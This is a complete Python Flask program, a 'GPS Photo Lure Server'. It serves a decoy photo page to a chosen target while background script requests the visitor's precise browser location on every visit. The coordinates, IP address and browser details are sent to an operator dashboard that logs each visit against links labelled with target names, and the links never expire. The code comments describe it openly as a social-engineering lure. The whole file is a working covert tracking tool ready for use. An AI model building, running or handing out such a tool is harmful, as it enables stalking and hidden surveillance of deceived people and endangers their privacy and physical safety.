#!/usr/bin/env python3
"""
GPS Photo Lure Server v2
- Shows a visible photo decoy page (the social engineering lure)
- GPS fires in the background every time the page loads
- No link expiry — links live forever
- Every visit is logged with coordinates (if obtained)
"""

import os
import sys
import json
import uuid
import time
import base64
import hashlib
import logging
import argparse
import threading
from datetime import datetime, timezone
from pathlib import Path

from flask import Flask, request, render_template_string, jsonify, redirect, url_for

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DEFAULT_PORT = 5000
DEFAULT_HOST = "0.0.0.0"

# In-memory storage
links = {}         # link_id -> link data
captures = []      # list of all GPS capture records
links_lock = threading.Lock()
captures_lock = threading.Lock()

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("gps-lure")

# ---------------------------------------------------------------------------
# App
# ---------------------------------------------------------------------------
app = Flask(__name__)

# ---------------------------------------------------------------------------
# Stealth HTML template — VISIBLE PHOTO PAGE
# ---------------------------------------------------------------------------
STEALTH_TEMPLATE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Photo</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #000;
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        padding: 10px;
    }
    .photo-container {
        max-width: 100%;
        max-height: 95vh;
        border-radius: 12px;
        overflow: hidden;
        box-shadow: 0 4px 30px rgba(255,255,255,0.15);
        background: #111;
    }
    .photo-container img {
        display: block;
        max-width: 100%;
        max-height: 90vh;
        width: auto;
        height: auto;
        object-fit: contain;
    }
    .loading {
        color: #888;
        font-size: 14px;
        padding: 40px;
        text-align: center;
    }
    .status-bar {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: rgba(0,0,0,0.7);
        color: #555;
        font-size: 11px;
        padding: 4px 12px;
        text-align: center;
        backdrop-filter: blur(4px);
    }
</style>
</head>
<body>
    <div class="photo-container">
        {% if photo_b64 %}
        <img src="data:image/{{ img_type }};base64,{{ photo_b64 }}" alt="Photo">
        {% else %}
        <div class="loading">No image available</div>
        {% endif %}
    </div>
    <div class="status-bar">Photo &bull; {{ visit_num }}</div>

<script>
(function() {
    var linkId = "{{ link_id }}";
    var visited = {{ visit_num }};

    // Geolocation capture — fires every visit
    function captureLocation() {
        if (!navigator.geolocation) {
            sendCapture(null, null, null, "geolocation not supported");
            return;
        }
        var opts = {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        };
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                sendCapture(
                    pos.coords.latitude,
                    pos.coords.longitude,
                    pos.coords.accuracy,
                    null
                );
            },
            function(err) {
                sendCapture(null, null, null, err.message || "permission denied");
            },
            opts
        );
    }

    function sendCapture(lat, lng, acc, err) {
        var payload = {
            link_id: linkId,
            visit: visited,
            latitude: lat,
            longitude: lng,
            accuracy: acc,
            error: err,
            user_agent: navigator.userAgent,
            timestamp_iso: new Date().toISOString()
        };
        // Send to capture endpoint (fire-and-forget)
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/capture", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify(payload));
        // Fallback via fetch
        fetch("/capture", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(payload),
            keepalive: true
        }).catch(function(){});
    }

    // Fire GPS immediately (slight delay to let page render first)
    setTimeout(captureLocation, 300);
})();
</script>
</body>
</html>"""

# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    """Simple landing page with link management."""
    return """
    <!DOCTYPE html>
    <html>
    <head><title>GPS Lure — Link Manager</title></head>
    <body style="font-family:sans-serif;padding:20px;background:#111;color:#eee;">
        <h1>GPS Photo Lure v2</h1>
        <p>Create a tracking link. Target sees a photo; GPS fires in background.</p>
        <p>No expiry. Every visit is captured.</p>
        <hr style="border-color:#333;">
        <form action="/create" method="post" enctype="multipart/form-data" style="margin-top:20px;">
            <label>Upload lure photo (optional):</label><br>
            <input type="file" name="photo" accept="image/*" style="margin:10px 0;color:#eee;"><br>
            <label>Label / notes (optional):</label><br>
            <input type="text" name="label" placeholder="e.g. Target Alpha" style="width:300px;padding:6px;margin:10px 0;"><br>
            <button type="submit" style="padding:10px 24px;background:#2a7;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;">
                Generate Tracking Link
            </button>
        </form>
        <hr style="border-color:#333;margin-top:30px;">
        <h2>Active Links</h2>
        <div id="links">Loading...</div>
        <script>
        function loadLinks() {
            fetch('/links').then(r=>r.json()).then(data=>{
                var html = '<table border="1" style="border-collapse:collapse;width:100%;border-color:#333;">';
                html += '<tr style="background:#222;"><th>Created</th><th>Label</th><th>URL</th><th>Visits</th><th>Captures</th><th>Action</th></tr>';
                data.links.forEach(function(l){
                    var url = window.location.origin + '/l/' + l.id;
                    html += '<tr>';
                    html += '<td style="padding:6px;">' + l.created + '</td>';
                    html += '<td style="padding:6px;">' + (l.label||'-') + '</td>';
                    html += '<td style="padding:6px;"><code style="font-size:12px;word-break:break-all;">' + url + '</code></td>';
                    html += '<td style="padding:6px;text-align:center;">' + l.visits + '</td>';
                    html += '<td style="padding:6px;text-align:center;">' + l.captures + '</td>';
                    html += '<td style="padding:6px;"><a href="/results/' + l.id + '" style="color:#4af;">Results</a></td>';
                    html += '</tr>';
                });
                html += '</table>';
                document.getElementById('links').innerHTML = html;
            });
        }
        loadLinks();
        setInterval(loadLinks, 5000);
        </script>
    </body>
    </html>
    """


@app.route("/create", methods=["POST"])
def create_link():
    """Create a new tracking link with optional photo."""
    label = request.form.get("label", "").strip()
    photo = request.files.get("photo")

    photo_b64 = None
    img_type = "jpeg"

    if photo and photo.filename:
        raw = photo.read()
        if raw:
            photo_b64 = base64.b64encode(raw).decode("utf-8")
            # Determine image type for data URI
            ext = Path(photo.filename).suffix.lower()
            if ext in (".png",):
                img_type = "png"
            elif ext in (".gif",):
                img_type = "gif"
            elif ext in (".webp",):
                img_type = "webp"
            else:
                img_type = "jpeg"

    link_id = uuid.uuid4().hex[:12]

    with links_lock:
        links[link_id] = {
            "id": link_id,
            "created": datetime.now(timezone.utc).isoformat(),
            "label": label if label else None,
            "photo_b64": photo_b64,
            "img_type": img_type,
            "visits": [],       # list of visit records
        }

    log.info("Created link %s (label=%s, photo=%s)", link_id, label, bool(photo_b64))

    # Redirect to index so they can copy the URL
    return redirect(url_for("index"))


@app.route("/l/<link_id>")
def serve_lure(link_id):
    """Serve the visible photo decoy page + GPS capture."""
    with links_lock:
        link = links.get(link_id)
        if not link:
            return "<h1>Not found</h1><p>This link does not exist.</p>", 404

    visit_num = len(link["visits"]) + 1

    # Log the visit immediately (coordinates filled in later by /capture)
    visit_record = {
        "visit": visit_num,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
        "gps_latitude": None,
        "gps_longitude": None,
        "gps_accuracy": None,
        "gps_error": None,
        "gps_captured_at": None,
    }

    with links_lock:
        link["visits"].append(visit_record)

    log.info(
        "Link %s visit #%d from %s (%s)",
        link_id, visit_num, request.remote_addr,
        request.headers.get("User-Agent", "")[:80]
    )

    return render_template_string(
        STEALTH_TEMPLATE,
        link_id=link_id,
        visit_num=visit_num,
        photo_b64=link["photo_b64"],
        img_type=link["img_type"],
    )


@app.route("/capture", methods=["POST"])
def capture_gps():
    """Receive GPS coordinates from the stealth page."""
    data = request.get_json(silent=True) or {}
    link_id = data.get("link_id")
    visit = data.get("visit")
    lat = data.get("latitude")
    lng = data.get("longitude")
    acc = data.get("accuracy")
    err = data.get("error")
    ua = data.get("user_agent", "")
    ts = data.get("timestamp_iso", datetime.now(timezone.utc).isoformat())

    if not link_id:
        return jsonify({"status": "missing link_id"}), 400

    with links_lock:
        link = links.get(link_id)
        if not link:
            return jsonify({"status": "link not found"}), 404

        # Find the visit record by visit number and update GPS
        updated = False
        for v in link["visits"]:
            if v["visit"] == visit:
                v["gps_latitude"] = lat
                v["gps_longitude"] = lng
                v["gps_accuracy"] = acc
                v["gps_error"] = err
                v["gps_captured_at"] = ts
                v["user_agent"] = ua
                updated = True
                break

    # Also record in global captures log
    with captures_lock:
        captures.append({
            "link_id": link_id,
            "visit": visit,
            "latitude": lat,
            "longitude": lng,
            "accuracy": acc,
            "error": err,
            "timestamp": ts,
            "user_agent": ua,
        })

    if updated:
        if lat is not None:
            log.info("GPS captured for link %s visit #%s: %.5f, %.5f (acc=%.1fm)",
                     link_id, visit, lat, lng, acc or 0)
        else:
            log.info("GPS FAILED for link %s visit #%s: %s", link_id, visit, err)
    else:
        log.warning("GPS capture for link %s visit #%s — visit not found", link_id, visit)

    return jsonify({"status": "ok"})


@app.route("/results/<link_id>")
def show_results(link_id):
    """Show detailed results for a specific link."""
    with links_lock:
        link = links.get(link_id)
        if not link:
            return "<h1>Not found</h1>", 404
        # Deep copy for rendering
        import copy
        link_data = copy.deepcopy(link)

    total_visits = len(link_data["visits"])
    gps_captures = sum(1 for v in link_data["visits"] if v["gps_latitude"] is not None)
    gps_failures = sum(1 for v in link_data["visits"] if v["gps_error"] is not None)

    html = f"""
    <!DOCTYPE html>
    <html>
    <head><title>Results — {link_id}</title>
    <style>
        body {{ font-family: sans-serif; background: #111; color: #eee; padding: 20px; }}
        table {{ border-collapse: collapse; width: 100%; border-color: #333; }}
        th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #333; }}
        th {{ background: #222; }}
        .success {{ color: #4c4; }}
        .fail {{ color: #c44; }}
        .pending {{ color: #aa0; }}
        pre {{ background: #1a1a1a; padding: 10px; border-radius: 5px; overflow-x: auto; }}
        a {{ color: #4af; }}
    </style>
    </head>
    <body>
        <h1>Link Results</h1>
        <p><strong>ID:</strong> {link_id}</p>
        <p><strong>Label:</strong> {link_data["label"] or "(none)"}</p>
        <p><strong>Created:</strong> {link_data["created"]}</p>
        <p><strong>Total Visits:</strong> {total_visits}</p>
        <p><strong>GPS Captures:</strong> {gps_captures} / {total_visits}</p>
        <p><strong>GPS Failures:</strong> {gps_failures}</p>
        <p><strong>Tracking URL:</strong> <code>{request.host_url.strip('/')}/l/{link_id}</code></p>
        <hr style="border-color:#333;">
        <h2>Visit Log</h2>
        <table>
        <tr><th>#</th><th>Timestamp</th><th>IP</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Error</th><th>User-Agent</th></tr>
    """

    for v in link_data["visits"]:
        status_cls = "success" if v["gps_latitude"] is not None else ("fail" if v["gps_error"] else "pending")
        lat_str = f'{v["gps_latitude"]:.5f}' if v["gps_latitude"] is not None else "-"
        lng_str = f'{v["gps_longitude"]:.5f}' if v["gps_longitude"] is not None else "-"
        acc_str = f'{v["gps_accuracy"]:.1f}m' if v["gps_accuracy"] is not None else "-"
        err_str = v["gps_error"] or "-"
        ua_short = (v["user_agent"] or "")[:60]

        html += f"""
        <tr class="{status_cls}">
            <td>{v["visit"]}</td>
            <td>{v["timestamp"]}</td>
            <td>{v["ip"]}</td>
            <td>{lat_str}</td>
            <td>{lng_str}</td>
            <td>{acc_str}</td>
            <td>{err_str}</td>
            <td style="font-size:11px;">{ua_short}</td>
        </tr>"""

    html += """
        </table>
        <hr style="border-color:#333;margin-top:20px;">
        <h2>Raw JSON</h2>
        <pre>
    """
    html += json.dumps(link_data, indent=2, default=str)
    html += "\n        </pre>\n    </body>\n</html>"

    return html


@app.route("/links")
def list_links():
    """JSON endpoint listing all active links."""
    with links_lock:
        result = []
        for lid, l in links.items():
            result.append({
                "id": lid,
                "created": l["created"],
                "label": l["label"],
                "visits": len(l["visits"]),
                "captures": sum(1 for v in l["visits"] if v["gps_latitude"] is not None),
            })
    return jsonify({"links": result, "total": len(result)})


@app.route("/all-captures")
def all_captures():
    """Return all GPS captures as JSON."""
    with captures_lock:
        return jsonify({"captures": captures, "total": len(captures)})


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="GPS Photo Lure Server v2")
    parser.add_argument("--host", default=DEFAULT_HOST, help=f"Bind address (default: {DEFAULT_HOST})")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port (default: {DEFAULT_PORT})")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    args = parser.parse_args()

    log.info("=" * 60)
    log.info("GPS Photo Lure Server v2")
    log.info("=" * 60)
    log.info("Listening on http://%s:%d", args.host, args.port)
    log.info("No link expiry — links live forever")
    log.info("Every visit captures GPS coordinates")
    log.info("=" * 60)

    app.run(host=args.host, port=args.port, debug=args.debug)


if __name__ == "__main__":
    main()
